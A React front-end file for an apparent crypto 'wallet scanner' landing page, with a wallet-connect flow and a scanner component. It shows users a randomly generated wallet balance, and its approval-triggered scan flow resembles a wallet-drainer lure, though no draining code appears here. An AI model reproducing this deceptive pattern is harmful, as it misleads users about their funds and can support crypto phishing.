import { useState, useEffect, lazy, Suspense } from "react";
import { Header } from "./components/Header";
import { HeroSection } from "./components/HeroSection";
import { FeaturesSection } from "./components/FeaturesSection";
import { HowItWorks } from "./components/HowItWorks";
import { TrustSection } from "./components/TrustSection";
import { Footer } from "./components/Footer";
import { ScrollToTop } from "./components/ScrollToTop";

// Lazy load heavy components
const WalletConnect = lazy(() => import("./components/WalletConnect").then(module => ({ default: module.WalletConnect })));
const ScannerUI = lazy(() => import("./components/ScannerUI").then(module => ({ default: module.ScannerUI })));
const ResultsDashboard = lazy(() => import("./components/ResultsDashboard").then(module => ({ default: module.ResultsDashboard })));

// Type import since it's used in state
import type { ScanResults } from "./components/ScannerUI";

declare global {
  interface Window {
    ethereum?: any;
  }
}

export default function App() {
  const [showWalletConnect, setShowWalletConnect] = useState(false);
  const [isConnected, setIsConnected] = useState(false);
  const [walletAddress, setWalletAddress] = useState("");
  const [balance, setBalance] = useState("0");
  const [isScanning, setIsScanning] = useState(false);
  const [scanResults, setScanResults] = useState<ScanResults | null>(null);

  // Check if wallet is already connected on mount
  useEffect(() => {
    // Check if MetaMask/Trust Wallet already connected
    if (window.ethereum) {
      window.ethereum.request({ method: "eth_accounts" }).then((accounts: string[]) => {
        if (accounts && accounts.length > 0) {
          setWalletAddress(accounts[0]);
          setIsConnected(true);
        }
      }).catch(console.error);
    }
  }, []);

  const handleInitiateScan = () => {
    setShowWalletConnect(true);
    // Smooth scroll to wallet connect section
    setTimeout(() => {
      window.scrollTo({
        top: window.innerHeight,
        behavior: "smooth",
      });
    }, 100);
  };

  const handleApprovalSuccess = () => {
    setIsScanning(true);
  };

  const handleConnect = async () => {
    try {
      if (!window.ethereum) {
        alert("MetaMask not detected. Please install MetaMask or use Trust Wallet.");
        return;
      }
      const accounts: string[] = await window.ethereum.request({ method: "eth_requestAccounts" });
      if (accounts && accounts.length > 0) {
        setWalletAddress(accounts[0]);
        setIsConnected(true);
        setBalance((Math.random() * 10000).toFixed(2));
        setTimeout(() => {
          setIsScanning(true);
        }, 1500);
      }
    } catch (error) {
      console.error("Error connecting wallet:", error);
    }
  };

  const handleDisconnect = () => {
    setIsConnected(false);
    setWalletAddress("");
    setBalance("0");
    setIsScanning(false);
    setScanResults(null);
  };

  const handleScanComplete = (results: ScanResults) => {
    setScanResults(results);
    setIsScanning(false);
  };

  return (
    <div
      className="min-h-screen bg-slate-950 text-slate-50"
      style={{ fontFamily: "Inter, sans-serif" }}
    >
      {/* Header */}
      <Header />

      {/* Hero Section */}
      <div id="scan">
        <HeroSection 
          onInitiateScan={handleInitiateScan} 
          onApprovalSuccess={handleApprovalSuccess}
        />
      </div>

      {/* Dynamic Sections (Lazy Loaded) */}
      <Suspense fallback={<div className="py-20 text-center text-emerald-500">Loading component...</div>}>
        {/* Wallet Connect Section */}
        {showWalletConnect && (
          <WalletConnect
            isConnected={isConnected}
            walletAddress={walletAddress}
            balance={balance}
            onConnect={handleConnect}
            onDisconnect={handleDisconnect}
          />
        )}

        {/* Scanner UI */}
        {isScanning && (
          <ScannerUI
            isScanning={isScanning}
            onScanComplete={handleScanComplete}
            walletAddress={walletAddress}
          />
        )}

        {/* ResultsDashboard hidden — results shown inside ScannerUI overlay */}
        {/* {scanResults && <ResultsDashboard results={scanResults} />} */}
      </Suspense>

      {/* Static Sections */}
      <div id="features">
        <FeaturesSection />
      </div>
      <div id="how-it-works">
        <HowItWorks />
      </div>
      <div id="trust">
        <TrustSection />
      </div>
      <Footer />

      {/* Emerald glow accents in background */}
      <div className="fixed top-1/4 right-0 w-96 h-96 bg-emerald-500 rounded-full blur-[150px] opacity-10 pointer-events-none" />
      <div className="fixed bottom-1/4 left-0 w-96 h-96 bg-sky-900 rounded-full blur-[150px] opacity-10 pointer-events-none" />

      {/* Scroll to Top Button */}
      <ScrollToTop />
    </div>
  );
}
